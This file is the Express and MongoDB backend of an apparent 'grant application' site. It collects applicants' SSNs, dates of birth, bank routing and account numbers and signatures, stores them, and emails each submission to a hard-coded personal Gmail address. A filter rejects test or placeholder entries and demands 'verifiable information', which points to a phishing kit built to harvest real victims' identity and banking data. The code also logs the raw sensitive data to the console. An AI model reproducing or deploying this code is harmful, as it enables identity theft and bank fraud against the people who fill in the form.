import express from "express";
import mongoose from "mongoose";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

// Allow requests from your frontend
app.use(cors({
  origin: "*", 
  methods: ["POST", "GET"]
}));

app.use(bodyParser.json());

// --- SERVE STATIC FILES (Deployment) ---
// Updated to point to the sibling frontend directory's build output
app.use(express.static(path.join(__dirname, '../frontend/dist')));
// Fallback to serving from root if needed during dev
app.use(express.static(path.join(__dirname, '../frontend')));

// --- DATABASE CONNECTION ---
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/grant_portal";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("MongoDB connection error:", err));

// --- SCHEMA ---
const ApplicationSchema = new mongoose.Schema({
  grantId: { type: String, required: true },
  fullName: { type: String, required: true },
  dob: String,
  phone: String,
  email: { type: String, required: true },
  address: String,
  ssn: String,
  bankName: String,
  routingNumber: String,
  accountName: String,
  accountNumber: String,
  certification: Boolean,
  signature: { type: String, required: true },
  status: { type: String, default: "Pending Review" },
  submittedAt: { type: Date, default: Date.now },
});

ApplicationSchema.index({ email: 1, grantId: 1 }, { unique: true });
const Application = mongoose.model("Application", ApplicationSchema);

// --- EMAIL TRANSPORT ---
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "admin@example.com", 
    pass: process.env.EMAIL_PASS || "password",   
  },
});

// --- HELPER: DETECT FAKE DATA ---
const isSuspicious = (data) => {
  const patterns = [
    /test/i, /demo/i, /fake/i, /123456789/, /987654321/, /000000000/, /555-555-5555/, /123 Main St/i
  ];
  const values = Object.values(data).join(' ');
  return patterns.some(pattern => pattern.test(values));
};

// --- ROUTE TO HANDLE FORM SUBMISSION ---
app.post("/submit", async (req, res) => {
  try {
    console.log("Received submission:", req.body);
    
    if (isSuspicious(req.body)) {
       return res.status(400).json({ 
         success: false, 
         message: "Submission flagged for invalid or test data. Please provide verifiable information." 
       });
    }

    if (!req.body.signature || req.body.signature.trim().toLowerCase() !== req.body.fullName.trim().toLowerCase()) {
       return res.status(400).json({ 
         success: false, 
         message: "Certification Failed: Digital Signature does not match the applicant's full legal name." 
       });
    }

    const applicationData = {
      ...req.body,
      routingNumber: req.body.branch 
    };

    const application = new Application(applicationData);
    await application.save();

    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || "admin@example.com",
        to: "anne67j@gmail.com",
        subject: `New Grant Application: ${req.body.fullName}`,
        text: `New Application Received.\nName: ${req.body.fullName}\nID: ${req.body.grantId}\nSigned: ${req.body.signature}`,
      });
    } catch (emailError) {
      console.warn("Email failed to send:", emailError.message);
    }

    res.status(200).json({ 
      success: true, 
      message: "Application securely archived.", 
      referenceId: application._id 
    });

  } catch (error) {
    console.error("Error saving application:", error);
    if (error.code === 11000) {
      return res.status(409).json({ 
        success: false, 
        message: "Duplicate Application: An application for this Grant ID has already been submitted with this email address." 
      });
    }
    res.status(500).json({ success: false, message: "Internal Server Error" });
  }
});

// --- SPA FALLBACK ---
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/dist/index.html'));
});

app.listen(PORT, () => console.log(`Server running securely on http://localhost:${PORT}`));